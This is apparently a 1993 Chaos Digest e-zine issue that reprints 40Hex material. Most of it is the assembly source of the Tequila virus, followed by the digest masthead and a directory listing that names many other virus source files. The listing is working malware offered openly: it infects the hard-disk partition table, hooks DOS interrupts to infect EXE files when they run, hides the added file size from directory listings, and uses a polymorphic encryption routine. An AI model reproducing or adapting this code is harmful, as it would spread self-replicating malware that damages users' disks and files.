   MOV W[09B0],BX            ;Masm Mod. Needed
   MOV W[09B2],ES            ;Masm Mod. Needed
   MOV ES,AX
   ES LES BX,[084]           ;Masm Mod. Needed
   MOV W[09B4],BX            ;Masm Mod. Needed
   MOV W[09B6],ES            ;Masm Mod. Needed
   MOV ES,AX
   ES MOV W[070],044F        ;Masm Mod. Needed
   ES MOV W[072],DS          ;Masm Mod. Needed
   STI
   RETF

INSTALL:
   CALL NEXT_LINE
 NEXT_LINE:
   POP SI
   SUB SI,028F
   PUSH SI
   PUSH AX
   PUSH ES
   PUSH CS
   POP DS
   MOV AX,ES
   ADD W[SI+2],AX
   ADD W[SI+4],AX
   DEC AX
   MOV ES,AX
   MOV AX,0FE02
   INT 021
   CMP AX,01FD
   JE NO_PARTITION_INFECTION
   ES CMP B[0],05A           ;Masm Mod. Needed
   JNE NO_PARTITION_INFECTION
   ES CMP W[3],0BB           ;Masm Mod. Needed
   JBE NO_PARTITION_INFECTION
   ES MOV AX,W[012]          ;Masm Mod. Needed
   SUB AX,0BB
   MOV ES,AX
   XOR DI,DI
   MOV CX,09A4
   CLD
   REP MOVSB
   PUSH ES
   POP DS
   CALL INFECT_PARTITION_TABLE
 NO_PARTITION_INFECTION:
   POP ES
   POP AX
   PUSH ES
   POP DS
   POP SI
   CS MOV SS,W[SI+4]         ;Masm Mod. Needed
 CHAIN_TO_THE_HOST_FILE:
   CS JMP D[SI]              ;Masm Mod. Needed

INFECT_PARTITION_TABLE:
   MOV AH,02A
   INT 021
   MOV W[6],CX               ;Masm Mod. Needed
   MOV W[8],DX               ;Masm Mod. Needed
   MOV AH,052
   INT 021
   ES MOV AX,W[BX-2]         ;Masm Mod. Needed
   MOV W[03E8],AX            ;Masm Mod. Needed
   MOV AX,03513
   INT 021
   MOV W[09A0],BX            ;Masm Mod. Needed
   MOV W[09A2],ES            ;Masm Mod. Needed
   MOV AX,03501
   INT 021
   MOV SI,BX
   MOV DI,ES
   MOV AX,02501
   MOV DX,03DA
   INT 021
   MOV B[0A],0               ;Masm Mod. Needed
   PUSHF
   POP AX
   OR AX,0100
   PUSH AX
   POPF
   MOV AX,0201
   MOV BX,09A4
   MOV CX,1
   MOV DX,080
   PUSH DS
   POP ES
   PUSHF
   CALL D[09A0]              ;Masm Mod. Needed
   PUSHF
   POP AX
   AND AX,0FEFF
   PUSH AX
   POPF
   PUSHF
   MOV AX,02501
   MOV DX,SI
   MOV DS,DI
   INT 021
   POPF
   JAE 0450                  ;Masm Mod. Needed
   JMP RET                   ;Masm Mod. Needed
   PUSH ES
   POP DS
   CMP W[BX+02E],0FE02
   JNE 045C                  ;Masm Mod. Needed
   JMP RET                   ;Masm Mod. Needed
   ADD BX,01BE
   MOV CX,4
   MOV AL,B[BX+4]
   CMP AL,4
   JE 0479                   ;Masm Mod. Needed
   CMP AL,6
   JE 0479                   ;Masm Mod. Needed
   CMP AL,1
   JE 0479                   ;Masm Mod. Needed
   ADD BX,010
   LOOP 0463                 ;Masm Mod. Needed
   JMP SHORT RET             ;Masm Mod. Needed
   MOV DL,080
   MOV DH,B[BX+5]
   MOV W[0228],DX            ;Masm Mod. Needed
   MOV AX,W[BX+6]
   MOV CX,AX
   MOV SI,6
   AND AX,03F
   CMP AX,SI
   JBE RET                   ;Masm Mod. Needed
   SUB CX,SI
   MOV DI,BX
   INC CX
   MOV W[0226],CX            ;Masm Mod. Needed
   MOV AX,0301
   MOV BX,09A4
   PUSHF
   CALL D[09A0]              ;Masm Mod. Needed
   JB RET                    ;Masm Mod. Needed
   DEC CX
   MOV W[DI+6],CX
   INC CX
   SUB W[DI+0C],SI
   SBB W[DI+0E],0
   MOV AX,0305
   MOV BX,0
   INC CX
   PUSHF
   CALL D[09A0]              ;Masm Mod. Needed
   JB RET                    ;Masm Mod. Needed
   MOV SI,01F6
   MOV DI,09A4
   MOV CX,034
   CLD
   REP MOVSB
   MOV AX,0301
   MOV BX,09A4
   MOV CX,1
   XOR DH,DH
   PUSHF
   CALL D[09A0]              ;Masm Mod. Needed
   RET

NEW_INTERRUPT_ONE:
   PUSH BP
   MOV BP,SP
   CS CMP B[0A],1            ;Masm Mod. Needed
   JE 0506                   ;Masm Mod. Needed
   CMP W[BP+4],09B4
   JA 050B                   ;Masm Mod. Needed
   PUSH AX
   PUSH ES
   LES AX,[BP+2]
   CS MOV W[09A0],AX         ;Masm Mod. Needed
   CS MOV W[09A2],ES         ;Masm Mod. Needed
   CS MOV B[0A],1
   POP ES
   POP AX
   AND W[BP+6],0FEFF
   POP BP
   IRET

NEW_INTERRUPT_13:
   CMP CX,1
   JNE 054E                  ;Masm Mod. Needed
   CMP DX,080
   JNE 054E                  ;Masm Mod. Needed
   CMP AH,3
   JA 054E                   ;Masm Mod. Needed
   CMP AH,2
   JB 054E                   ;Masm Mod. Needed
   PUSH CX
   PUSH DX
   DEC AL
   JE 0537                   ;Masm Mod. Needed
   PUSH AX
   PUSH BX
   ADD BX,0200
   INC CX
   PUSHF
   CS CALL D[09A0]           ;Masm Mod. Needed
   POP BX
   POP AX
   MOV AL,1
   CS MOV CX,W[0226]         ;Masm Mod. Needed
   CS MOV DX,W[0228]         ;Masm Mod. Needed
   PUSHF
   CS CALL D[09A0]           ;Masm Mod. Needed
   POP DX
   POP CX
   RETF 2
   CS JMP D[09A0]            ;Masm Mod. Needed

NEW_TIMER_TICK_INTERRUPT:
   PUSH AX
   PUSH BX
   PUSH ES
   PUSH DS
   XOR AX,AX
   MOV ES,AX
   PUSH CS
   POP DS
   ES LES BX,[084]           ;Masm Mod. Needed
   MOV AX,ES
   CMP AX,0800
   JA 05B0                   ;Masm Mod. Needed
   CMP AX,W[09B6]
   JNE 0575                  ;Masm Mod. Needed
   CMP BX,W[09B4]
   JE 05B0                   ;Masm Mod. Needed
   MOV W[09B4],BX            ;Masm Mod. Needed
   MOV W[09B6],ES            ;Masm Mod. Needed
   XOR AX,AX
   MOV DS,AX
   CS LES BX,[09B0]          ;Masm Mod. Needed
   MOV W[070],BX             ;Masm Mod. Needed
   MOV W[072],ES             ;Masm Mod. Needed
   LES BX,[04C]              ;Masm Mod. Needed
   CS MOV W[09A0],BX         ;Masm Mod. Needed
   CS MOV W[09A2],ES         ;Masm Mod. Needed
   MOV W[04C],09BE           ;Masm Mod. Needed
   MOV W[04E],CS             ;Masm Mod. Needed
   MOV W[084],04B1           ;Masm Mod. Needed
   MOV W[086],CS             ;Masm Mod. Needed
   POP DS
   POP ES
   POP BX
   POP AX
   IRET

INT_21_INTERCEPT:
   CMP AH,011
   JB CHECK_FOR_HANDLE
   CMP AH,012
   JA CHECK_FOR_HANDLE
   CALL ADJUST_FCB_MATCHES
   RETF 2
 CHECK_FOR_HANDLE:
   CMP AH,04E
   JB CHECK_FOR_PREVIOUS_INSTALLATION
   CMP AH,04F
   JA CHECK_FOR_PREVIOUS_INSTALLATION
   CALL ADJUST_HANDLE_MATCHES
   RETF 2
 CHECK_FOR_PREVIOUS_INSTALLATION:
   CMP AX,0FE02
   JNE CHECK_FOR_MESSAGE_PRINT
   NOT AX
   IRET
 CHECK_FOR_MESSAGE_PRINT:
   CMP AX,0FE03
   JNE CHECK_FOR_EXECUTE
   CS CMP W[6],0             ;Masm Mod. Needed
   JNE CHAIN_TO_TRUE_INT_21
   CALL PRINT_MESSAGE
   IRET
 CHECK_FOR_EXECUTE:
   CMP AX,04B00
   JE SET_STACK
   CMP AH,04C
   JNE CHAIN_TO_TRUE_INT_21
 SET_STACK:
   CS MOV W[09A6],SP         ;Masm Mod. Needed
   CS MOV W[09A8],SS         ;Masm Mod. Needed
   CLI
   PUSH CS
   POP SS
   MOV SP,0AE5
   STI
   CMP AH,04C
   JNE TO_AN_INFECTION
   CALL PROGRAM_TERMINATION_ROUTINE
   JMP SHORT NO_INFECTION
 TO_AN_INFECTION:
   CALL INFECT_THE_FILE
 NO_INFECTION:
   CLI
   CS MOV SS,W[09A8]         ;Masm Mod. Needed
   CS MOV SP,W[09A6]         ;Masm Mod. Needed
   STI
   JMP SHORT CHAIN_TO_TRUE_INT_21
 CHAIN_TO_TRUE_INT_21:
   CS INC W[09BC]            ;Masm Mod. Needed
   CS JMP D[09B4]            ;Masm Mod. Needed

NEW_CRITICAL_ERROR_HANDLER:
   MOV AL,3
   IRET

ADJUST_FCB_MATCHES:
   PUSH BX
   PUSH ES
   PUSH AX
   MOV AH,02F
   CALL INT_21
   POP AX
   PUSHF
   CS CALL D[09B4]           ;Masm Mod. Needed
   PUSHF
   PUSH AX
   CMP AL,0FF
   JE 0664                   ;Masm Mod. Needed
   ES CMP B[BX],0FF          ;Masm Mod. Needed
   JNE 064F                  ;Masm Mod. Needed
   ADD BX,7
   ES MOV AL,B[BX+017]       ;Masm Mod. Needed
   AND AL,01F
   CMP AL,01F
   JNE 0664                  ;Masm Mod. Needed
   ES SUB W[BX+01D],09A4     ;Masm Mod. Needed
   ES SBB W[BX+01F],0        ;Masm Mod. Needed
   POP AX
   POPF
   POP ES
   POP BX
   RET

ADJUST_HANDLE_MATCHES:
   PUSH BX
   PUSH ES
   PUSH AX
   MOV AH,02F
   CALL INT_21
   POP AX
   PUSHF
   CS CALL D[09B4]           ;Masm Mod. Needed
   PUSHF
   PUSH AX
   JB 0691                   ;Masm Mod. Needed
   ES MOV AL,B[BX+016]       ;Masm Mod. Needed
   AND AL,01F
   CMP AL,01F
   JNE 0691                  ;Masm Mod. Needed
   ES SUB W[BX+01A],09A4     ;Masm Mod. Needed
   ES SBB W[BX+01C],0        ;Masm Mod. Needed
   POP AX
   POPF
   POP ES
   POP BX
   RET

WRITE_TO_THE_FILE:
   MOV AH,040
   JMP 069C                  ;Masm Mod. Needed

READ_FROM_THE_FILE:
   MOV AH,03F
   CALL 06B4                 ;Masm Mod. Needed
   JB RET                    ;Masm Mod. Needed
   SUB AX,CX
   RET

MOVE_TO_END_OF_FILE:
   XOR CX,CX
   XOR DX,DX
   MOV AX,04202
   JMP 06B4                  ;Masm Mod. Needed

MOVE_TO_BEGINNING_OF_FILE:
   XOR CX,CX
   XOR DX,DX
   MOV AX,04200
   CS MOV BX,W[09A4]         ;Masm Mod. Needed

INT_21:
   CLI
   PUSHF
   CS CALL D[09B4]           ;Masm Mod. Needed
   RET

INFECT_THE_FILE:
   PUSH AX
   PUSH BX
   PUSH CX
   PUSH DX
   PUSH SI
   PUSH DI
   PUSH ES
   PUSH DS
   CALL CHECK_LETTERS_IN_FILENAME
   JAE GOOD_NAME
   JMP BAD_NAME

GOOD_NAME:
   PUSH DX
   PUSH DS
   PUSH CS
   POP DS

SAVE_AND_REPLACE_CRITICAL_ERROR_HANDLER:
   MOV AX,03524
   CALL INT_21
   MOV W[09B8],BX            ;Masm Mod. Needed
   MOV W[09BA],ES            ;Masm Mod. Needed
   MOV AX,02524
   MOV DX,052A
   CALL INT_21
   POP DS
   POP DX

SAVE_AND_REPLACE_FILE_ATTRIBUTE:
   MOV AX,04300
   CALL INT_21
   CS MOV W[09AA],CX         ;Masm Mod. Needed
   JAE 06FE                  ;Masm Mod. Needed
   JMP RESTORE_CRIT_HANDLER
   MOV AX,04301
   XOR CX,CX
   CALL INT_21
   JB 077C                   ;Masm Mod. Needed

OPEN_FILE_FOR_READ_WRITE:
   MOV AX,03D02
   CALL INT_21
   JB 0771                   ;Masm Mod. Needed
   PUSH DX
   PUSH DS
   PUSH CS
   POP DS
   MOV W[09A4],AX            ;Masm Mod. Needed

GET_FILEDATE:
   MOV AX,05700
   CALL 06B4                 ;Masm Mod. Needed
   JB 075C                   ;Masm Mod. Needed
   MOV W[09AC],DX            ;Masm Mod. Needed
   MOV W[09AE],CX            ;Masm Mod. Needed

READ_AND_CHECK_EXE_HEADER:
   CALL 06AD                 ;Masm Mod. Needed
   MOV DX,0A49
   MOV CX,01C
   CALL 069A                 ;Masm Mod. Needed
   JB 075C                   ;Masm Mod. Needed
   PUSH DS
   POP ES
   MOV DI,0E8
   MOV CX,020
   CMP W[0A49],05A4D         ;Masm Mod. Needed
   JNE 075C                  ;Masm Mod. Needed
   MOV AX,W[0A5B]
   CLD
   REPNE SCASW
   JNE 0754                  ;Masm Mod. Needed
   OR W[09AE],01F            ;Masm Mod. Needed
   JMP 075C                  ;Masm Mod. Needed
   CALL READ_PAST_END_OF_FILE
   JB 075C                   ;Masm Mod. Needed
   CALL ENCRYPT_AND_WRITE_TO_FILE

RESTORE_ALTERED_DATE:
   MOV AX,05701
   MOV DX,W[09AC]
   MOV CX,W[09AE]
   CALL 06B4                 ;Masm Mod. Needed

CLOSE_THE_FILE:
   MOV AH,03E
   CALL 06B4                 ;Masm Mod. Needed

RESTORE_FILE_ATTRIBUTE:
   POP DS
   POP DX
   MOV AX,04301
   CS MOV CX,W[09AA]         ;Masm Mod. Needed
   CALL INT_21

RESTORE_CRIT_HANDLER:
   MOV AX,02524
   CS LDS DX,[09B8]          ;Masm Mod. Needed
   CALL INT_21

BAD_NAME:
   POP DS
   POP ES
   POP DI
   POP SI
   POP DX
   POP CX
   POP BX
   POP AX
   RET

CHECK_LETTERS_IN_FILENAME:
   PUSH DS
   POP ES
   MOV DI,DX
   MOV CX,-1
   XOR AL,AL
   CLD
   REPNE SCASB
   NOT CX
   MOV DI,DX
   MOV AX,04353
   MOV SI,CX
   SCASW
   JE 07B7             ;Masm Mod. Needed
   DEC DI
   LOOP 07A5           ;Masm Mod. Needed
   MOV CX,SI
   MOV DI,DX
   MOV AL,056
   REPNE SCASB
   JE 07B7             ;Masm Mod. Needed
   CLC
   RET
   STC
   RET

READ_PAST_END_OF_FILE:
   MOV CX,-1
   MOV DX,-0A
   CALL 06A8           ;Masm Mod. Needed
   MOV DX,0A65
   MOV CX,8
   CALL 069A           ;Masm Mod. Needed
   JB RET              ;Masm Mod. Needed
   CMP W[0A65],0FDF0   ;Masm Mod. Needed
   JNE 07F0            ;Masm Mod. Needed
   CMP W[0A67],0AAC5   ;Masm Mod. Needed
   JNE 07F0            ;Masm Mod. Needed
   MOV CX,-1
   MOV DX,-9
   CALL 06A8           ;Masm Mod. Needed
   MOV DX,0A6B
   MOV CX,4
   CALL 0696           ;Masm Mod. Needed
   RET
   CLC
   RET

ENCRYPT_AND_WRITE_TO_FILE:
   CALL MOVE_TO_END_OF_FILE
   MOV SI,AX
   MOV DI,DX
   MOV BX,0A49
   MOV AX,W[BX+4]
   MUL W[0D]           ;Masm Mod. Needed
   SUB AX,SI
   SBB DX,DI
   JAE 080C            ;Masm Mod. Needed
   JMP OUT_OF_ENCRYPT
   MOV AX,W[BX+8]
   MUL W[0B]           ;Masm Mod. Needed
   SUB SI,AX
   SBB DI,DX
   MOV AX,W[BX+0E]
   MOV W[4],AX         ;Masm Mod. Needed
   ADD W[4],010        ;Masm Mod. Needed
   MUL W[0B]           ;Masm Mod. Needed
   ADD AX,W[BX+010]
   SUB AX,SI
   SBB DX,DI
   JB 083C             ;Masm Mod. Needed
   SUB AX,080
   SBB DX,0
   JB RET              ;Masm Mod. Needed
   ADD W[BX+0E],09B
   MOV AX,W[BX+016]
   ADD AX,010
   MOV W[2],AX         ;Masm Mod. Needed
   MOV AX,W[BX+014]
   MOV W[0],AX         ;Masm Mod. Needed
   CALL 06A4           ;Masm Mod. Needed
   ADD AX,09A4
   ADC DX,0
   DIV W[0D]           ;Masm Mod. Needed
   INC AX
   MOV W[0A4D],AX      ;Masm Mod. Needed
   MOV W[0A4B],DX      ;Masm Mod. Needed
   MOV DX,DI
   MOV AX,SI
   DIV W[0B]           ;Masm Mod. Needed
   MOV W[0A5F],AX      ;Masm Mod. Needed
   MOV BX,DX
   ADD DX,0960
   MOV W[0A5D],DX      ;Masm Mod. Needed
   CALL COPY_TO_HIGH_MEMORY_ENCRYPT_WRITE
   JB RET              ;Masm Mod. Needed
   OR W[09AE],01F      ;Masm Mod. Needed
   MOV BX,W[09BC]
   AND BX,01F
   SHL BX,1
   MOV AX,W[BX+0E8]
   MOV W[0A5B],AX       ;Masm Mod. Needed
   CALL MOVE_TO_BEGINNING_OF_FILE
   MOV CX,01C
   MOV DX,0A49

------------------------------

End of Chaos Digest #1.43
************************************

Chaos Digest              Mercredi 2 Juin 1993        Volume 1 : Numero 44
                             ISSN 1244-4901

       Editeur: Jean-Bernard Condat (jbcondat@attmail.com)
       Archiviste: Yves-Marie Crabbe
       Co-Redacteurs: Arnaud Bigare, Stephane Briere

TABLE DES MATIERES, #1.44 (2 Juin 1993)
File 1--40H VMag Issue 1 Volume 4 #012(2)-014 (reprint)
File 2--Adresse electronique de Bill Clinton (news)
File 3--FIRST, nouveau forum anti-hackers aux USA (lutte)
File 4--Liste de diffusion de _The Hack Report_ (abonnement)
File 5--Autre type de chaos (identification)

Chaos Digest is a weekly electronic journal/newsletter. Subscriptions are
available at no cost by sending a message to:
                linux-activists-request@niksula.hut.fi
with a mail header or first line containing the following informations:
                    X-Mn-Admin: join CHAOS_DIGEST

The editors may be contacted by voice (+33 1 47874083), fax (+33 1 47877070)
or S-mail at: Jean-Bernard Condat, Chaos Computer Club France [CCCF], B.P.
155, 93404 St-Ouen Cedex, France.  He is a member of the EICAR and EFF (#1299)
groups.

Issues of ChaosD can also be found from the ComNet in Luxembourg BBS (+352)
466893.  Back issues of ChaosD can be found on the Internet as part of the
Computer underground Digest archives. They're accessible using anonymous FTP:

        * kragar.eff.org [192.88.144.4] in /pub/cud/chaos
        * uglymouse.css.itd.umich.edu [141.211.182.53] in /pub/CuD/chaos
        * halcyon.com [192.135.191.2] in /pub/mirror/cud/chaos
        * ftp.cic.net [192.131.22.2] in /e-serials/alphabetic/c/chaos-digest
        * cs.ubc.ca [137.82.8.5] in /mirror3/EFF/cud/chaos
        * ftp.ee.mu.oz.au [128.250.77.2] in /pub/text/CuD/chaos
        * nic.funet.fi [128.214.6.100] in /pub/doc/cud/chaos
        * orchid.csv.warwick.ac.uk [137.205.192.5] in /pub/cud/chaos

CHAOS DIGEST is an open forum dedicated to sharing French information among
computerists and to the presentation and debate of diverse views. ChaosD
material may be reprinted for non-profit as long as the source is cited.
Some authors do copyright their material, and they should be contacted for
reprint permission.  Readers are encouraged to submit reasoned articles in
French, English or German languages relating to computer culture and
telecommunications.  Articles are preferred to short responses.  Please
avoid quoting previous posts unless absolutely necessary.

DISCLAIMER: The views represented herein do not necessarily represent
            the views of the moderators. Chaos Digest contributors
            assume all responsibility for ensuring that articles
            submitted do not violate copyright protections.

----------------------------------------------------------------------

Date: Tue May 11 09:24:40 PDT 1993
From: 0005847161@mcimail.com (American_Eagle_Publication_Inc. )
Subject: File 1--40H VMag Issue 1 Volume 4 #012(2)-014 (reprint)

[suite du listing du virus Tequila]


WRITE_THE_NEW_HEADER:
   CALL 0696             ;Masm Mod. Needed
 OUT_OF_ENCRYPT:
   RET

COPY_TO_HIGH_MEMORY_ENCRYPT_WRITE:
   PUSH BP
   XOR AH,AH
   INT 01A
   MOV AX,DX
   MOV BP,DX
   PUSH DS
   POP ES
   MOV DI,0960
   MOV SI,DI
   MOV CX,020
   CLD
   REP STOSW
   XOR DX,DX
   MOV ES,DX
   CALL ENCRYPT_STEP_ONE
   CALL ENCRYPT_STEP_TWO
   CALL ENCRYPT_STEP_THREE
   MOV B[SI],0E9
   MOV DI,028C
   SUB DI,SI
   SUB DI,3
   INC SI
   MOV W[SI],DI
   MOV AX,0A04
   CALL AX
   POP BP
   RET

ENCRYPT_STEP_ONE:
   DEC BP
   ES TEST B[BP],2           ;Masm Mod. Needed
   JNE 08EB                  ;Masm Mod. Needed
   MOV B[SI],0E
   INC SI
   CALL GARBLER
   MOV B[SI],01F
   INC SI
   CALL GARBLER
   RET
   MOV W[SI],0CB8C
   INC SI
   INC SI
   CALL GARBLER
   MOV W[SI],0DB8E
   INC SI
   INC SI
   CALL GARBLER
   RET

ENCRYPT_STEP_TWO:
   AND CH,0FE
   DEC BP
   ES TEST B[BP],2           ;Masm Mod. Needed
   JE 0920                   ;Masm Mod. Needed
   OR CH,1
   MOV B[SI],0BE
   INC SI
   MOV W[SI],BX
   INC SI
   INC SI
   CALL GARBLER
   ADD BX,0960
   TEST CH,1
   JE 0934                   ;Masm Mod. Needed
   MOV B[SI],0BB
   INC SI
   MOV W[SI],BX
   INC SI
   INC SI
   CALL GARBLER
   ADD BX,0960
   TEST CH,1
   JE 090C                   ;Masm Mod. Needed
   SUB BX,0960
   CALL GARBLER
   MOV B[SI],0B9
   INC SI
   MOV AX,0960
   MOV W[SI],AX
   INC SI
   INC SI
   CALL GARBLER
   CALL GARBLER
   RET

ENCRYPT_STEP_THREE:
   MOV AH,014
   MOV DH,017
   TEST CH,1
   JE 0958                   ;Masm Mod. Needed
   XCHG DH,AH
   MOV DI,SI
   MOV AL,08A
   MOV W[SI],AX
   INC SI
   INC SI
   CALL GARBLER
   XOR DL,DL
   MOV B[0A39],028           ;Masm Mod. Needed
   DEC BP
   ES TEST B[BP],2           ;Masm Mod. Needed
   JE 0978                   ;Masm Mod. Needed
   MOV DL,030
   MOV B[0A39],DL            ;Masm Mod. Needed
   MOV W[SI],DX
   INC SI
   INC SI
   MOV W[SI],04346
   INC SI
   INC SI
   CALL GARBLER
   MOV AX,0FE81
   MOV CL,0BE
   TEST CH,1
   JE 0993                   ;Masm Mod. Needed
   MOV AH,0FB
   MOV CL,0BB
   MOV W[SI],AX
   INC SI
   INC SI
   PUSH BX
   ADD BX,040
   MOV W[SI],BX
   INC SI
   INC SI
   POP BX
   MOV B[SI],072
   INC SI
   MOV DX,SI
   INC SI
   CALL GARBLER
   MOV B[SI],CL
   INC SI
   MOV W[SI],BX
   INC SI
   INC SI
   MOV AX,SI
   SUB AX,DX
   DEC AX
   MOV BX,DX
   MOV B[BX],AL
   CALL GARBLER
   CALL GARBLER
   MOV B[SI],0E2
   INC SI
   SUB DI,SI
   DEC DI
   MOV AX,DI
   MOV B[SI],AL
   INC SI
   CALL GARBLER
   RET

GARBLER:
   DEC BP
   ES TEST B[BP],0F          ;Masm Mod. Needed
   JE RET                    ;Masm Mod. Needed
   DEC BP
   ES MOV AL,B[BP]           ;Masm Mod. Needed
   TEST AL,2
   JE 0A0E                   ;Masm Mod. Needed
   TEST AL,4
   JE 09F7                   ;Masm Mod. Needed
   TEST AL,8
   JE 09F1                   ;Masm Mod. Needed
   MOV W[SI],0C789
   INC SI
   INC SI
   JMP RET                   ;Masm Mod. Needed
   MOV B[SI],090
   INC SI
   JMP RET                   ;Masm Mod. Needed
   MOV AL,085
   DEC BP
   ES MOV AH,B[BP]           ;Masm Mod. Needed
   TEST AH,2
   JE 0A05                   ;Masm Mod. Needed
   DEC AL
   OR AH,0C0
   MOV W[SI],AX
   INC SI
   INC SI
   JMP RET                   ;Masm Mod. Needed
   DEC BP
   ES TEST B[BP],2           ;Masm Mod. Needed
   JE 0A1A                   ;Masm Mod. Needed
   MOV AL,039
   JMP 09F9                  ;Masm Mod. Needed
   MOV B[SI],0FC
   INC SI
   RET

MAKE_THE_DISK_WRITE:
   CALL PERFORM_ENCRYPTION_DECRYPTION
   MOV AH,040
   MOV BX,W[09A4]
   MOV DX,0
   MOV CX,09A4
   PUSHF
   CALL D[09B4]              ;Masm Mod. Needed
   JB 0A37                   ;Masm Mod. Needed
   SUB AX,CX
   PUSHF
   CMP B[0A39],028           ;Masm Mod. Needed
   JNE 0A44                  ;Masm Mod. Needed
   MOV B[0A39],0             ;Masm Mod. Needed
   CALL PERFORM_ENCRYPTION_DECRYPTION
   POPF
   RET

PERFORM_ENCRYPTION_DECRYPTION:
   MOV BX,0
   MOV SI,0960
   MOV CX,0960
   MOV DL,B[SI]
   XOR B[BX],DL
   INC SI
   INC BX
   CMP SI,09A0
   JB 0A61                   ;Masm Mod. Needed
   MOV SI,0960
   LOOP 0A52                 ;Masm Mod. Needed
   RET

THE_FILE_DECRYPTING_ROUTINE:
   PUSH CS
   POP DS
   MOV BX,4
   MOV SI,0964
   MOV CX,0960
   MOV DL,B[SI]
   ADD B[BX],DL
   INC SI
   INC BX
   CMP SI,09A4
   JB 0A7E                   ;Masm Mod. Needed
   MOV SI,0964
   LOOP 0A6F                 ;Masm Mod. Needed
   JMP 0390                  ;Masm Mod. Needed

;========== THE FOLLOWING IS NOT PART OF THE VIRUS ========
;==========       BUT IS MERELY THE BOOSTER.       ========

START:
   LEA W[0104],EXIT          ;Masm Mod. Needed
   MOV W[0106],CS            ;Masm Mod. Needed
   MOV BX,CS
   SUB W[0106],BX            ;Masm Mod. Needed
   JMP INSTALL

EXIT:
   INT 020

TEQUILA ENDP
CODE_SEG ENDS
END TEQUILA

+++++

40Hex Issue 4                                            December 1991

Left Blank
Cause its bad
luck
    how about something real dumb like....


Directory of C:\TASM

.            
     11-28-91  11:44a
..           
     11-28-91  11:44a
LAB          
     12-10-91   8:45p
1605     ASM     38553 12-09-91  12:31p
911      ASM     19267 12-10-91   7:21p
911      SDF      7084 12-10-91  10:41p
BBRAINS  ASM      8990 08-06-91   3:04p
BMONDAY  ASM     21455 12-09-91  12:31p
BOBVIRUS ASM     21280 12-14-91   4:38p
BRU_TEST COM        11 12-16-91   1:52p
CANCER   ASM      2600 02-09-91  12:38a
DARTH2   ASM      8938 12-09-91  11:50a
DEADPOOL ASM      5324 12-14-91   1:00a
DIR2SCAN ASM       892 12-22-91   1:17a
DIR2SCAN COM       112 12-22-91   1:17a
EMFII    ASM     16755 12-08-91  10:55p
FILES    DOC      2373 12-11-91   9:58a
FUNNY    ASM      5807 12-18-91  12:46p
FUNNY    COM       208 12-18-91  12:46p
GREP     DOC     13619 03-13-91   2:02a
HAPPY    ASM      5667 12-18-91  12:32p
HAPPY    MAP        34 12-25-91  11:27a
HEADER              94 12-09-91  10:25a
JOKER    ASM     16258 11-10-91  10:55p
KILL-FSP ASM      1475 11-12-91   4:28p
KILL-FSP COM        55 12-25-91  11:26a
KILL-FSP EXE       823 12-25-91  11:26a
KILL-FSP MAP       103 12-25-91  11:26a
KILL-FSP OBJ       195 12-25-91  11:26a
MAKE     EXE     37056 03-13-91   2:02a
MANUAL   DOC     52126 03-13-91   2:02a
MBIOS    MAC     13380 03-13-91   2:02a
MG-1     ASM      4527 12-17-91  10:58a
MG-1     SDF      2319 12-17-91  10:58a
NAILME   ASM       206 12-18-91  10:01p
NAILME   COM       100 12-19-91  10:26a
OBJXREF  DOC     18404 03-13-91   2:02a
PARITY   ASM      5837 12-09-91  12:49p
PH-VIR1  TXT     22086 11-04-91   9:00p
PROLOG   DOC     23811 03-13-91   2:02a
RAGE     ASM      9335 11-29-91  12:17p
SR       EXE    117543 10-30-89   8:00a
SURVEY   DOC      4479 11-29-91   1:01p
TASM     EXE    106521 03-13-91   2:02a
TASM     TAH    167927 03-13-91   2:02a
TCREF    DOC      4954 03-13-91   2:02a
TCREF    EXE      7856 03-13-91   2:02a
TD       EXE    409360 03-13-91   2:02a
TDCONFIG TD       1208 12-06-91  12:01p
TDCONVRT EXE     35366 03-13-91   2:02a
TDDEV    EXE      8544 03-13-91   2:02a
TDHELP   TDH    126541 03-13-91   2:02a
TDINST   EXE    107638 03-13-91   2:02a
TDMAP    EXE     16944 03-13-91   2:02a
TDMEM    EXE     14256 12-24-91   8:19p
TDNMI    COM       644 03-13-91   2:02a
TDPACK   EXE     25520 03-13-91   2:02a
TDREMOTE EXE     20738 03-13-91   2:02a
TDRF     EXE     17376 03-13-91   2:02a
TDSTRIP  EXE     13868 03-13-91   2:02a
TDUMP    EXE     70554 03-13-91   2:02a
THELP    COM      9912 11-28-91  11:46a
THELP    DOC      7619 03-13-91   2:02a
TINY     ASM      4233 01-01-80  12:26a
TINY     TXT        92 01-01-80  12:25a
TINYB    ASM      4404 01-01-80  12:32a
TINYB    TXT        89 01-01-80  12:31a
TINYC    ASM      4669 01-01-80  12:14a
TINYC    TXT       118 01-01-80  12:31a
TINYD    ASM      5486 01-01-80  12:02a
TINYE    ASM      6464 01-01-80  12:09a
TLIB     EXE     35668 03-13-91   2:02a
TLINK    DOC      3837 03-13-91   2:02a
TLINK    EXE     53510 03-13-91   2:02a
TOUCH    COM      5118 03-13-91   2:02a
UPDATE   DOC     20266 03-13-91   2:02a
VIENNA   ASM     26395 09-30-87  12:59a
VIOL-C   ASM     19096 12-16-91  10:25p
VSAFE    COM     32050 03-28-91   1:00p
VWATCH   COM     12263 03-28-91   1:00p
WIN      COM     19358 12-24-91   9:52p
WINFIX   ASM      2603 12-21-91   8:18p
WINFIX   COM       357 12-24-91   9:52p
WINFIX   MAP       103 12-24-91   9:52p
WINFIX   OBJ       553 12-24-91   9:52p
       85 file(s)    1939259 bytes

Directory of C:\TASM\LAB

.            
     12-10-91   8:45p
..           
     12-10-91   8:45p
LAB          
     12-10-91   8:46p
AMAG0589 TXT     46529 05-21-89   7:06p
AMAG1289 TXT    113270 12-16-89  12:21p
BIT      ASM       778 08-30-91   8:33p
BIT      MAP       103 12-24-91  11:31p
BIT      OBJ       192 12-24-91  11:31p
BUGOFF   ASM       903 12-25-91  11:59a
BUGOFF   COM        43 12-25-91  11:59a
BUGOFF   MAP       103 12-25-91  11:59a
BUGOFF   OBJ       198 12-25-91  11:59a
CRACK-W  ASM      1430 12-24-91   7:49p
CRACK-W  MAP       103 12-24-91   7:47p
DIR      ASM     10274 12-25-91  12:46a
DIR      MAP        99 12-25-91  12:48a
DIR      OBJ       961 12-25-91  12:48a
DIR      SDF      5032 12-25-91  12:46a
DL       ASM       416 12-14-91   6:35p
DUMB     DOC     52346 12-19-91   1:46p
ENW                  3 12-19-91   6:02p
EXE_FILE ASM        80 12-24-91  12:36a
EXE_FILE EXE       516 12-24-91  12:36a
EXE_FILE MAP       220 12-24-91  12:36a
EXE_FILE OBJ       183 12-24-91  12:36a
FUCK_UP  DOC       198 12-23-91  10:33a
